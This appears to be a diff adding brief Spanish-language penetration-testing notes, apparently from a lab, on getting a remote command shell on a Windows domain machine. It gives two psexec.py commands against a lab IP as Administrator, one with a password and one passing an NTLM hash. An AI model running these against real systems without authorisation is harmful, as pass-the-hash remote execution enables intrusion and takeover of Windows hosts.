@@ -1,0 +1,9 @@
+Para conectarte a algun pc de un dominio con credenciales
+
+CODE(password ASCII) -> psexec.py WORKGROUP\Administrator@10.10.10.63 cmd.exe
+
+Password: 
+
+
+
+CODE(password HASH NTLM)[Cogeremos el ultimo : del hash] -> psexec.py WORKGROUP\Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
